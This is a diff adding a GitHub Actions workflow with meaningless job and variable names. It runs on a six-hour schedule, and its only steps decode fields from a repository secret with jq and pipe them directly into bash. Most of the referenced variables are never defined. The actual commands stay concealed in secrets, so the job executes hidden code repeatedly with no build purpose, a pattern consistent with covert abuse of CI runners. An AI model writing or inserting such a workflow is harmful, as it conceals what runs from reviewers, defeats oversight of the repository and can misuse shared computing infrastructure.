@@ -1,0 +1,23 @@
+name: chenmeijiao2010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenmeijiao2010
+        env:
+          wq78389: ${{ secrets.wq78389 }}
+        run: |
+          echo $wq78389 | jq -r .dp32 | /bin/bash
+          echo $x9026 | jq -r .jg568 | /bin/bash
+          echo $r059 | jq -r .zpmt8061 | /bin/bash
+          echo $er14357 | jq -r .b3 | /bin/bash
+          echo $i141 | jq -r .drsvu16 | /bin/bash
+          echo $d1 | jq -r .saak16 | /bin/bash
+
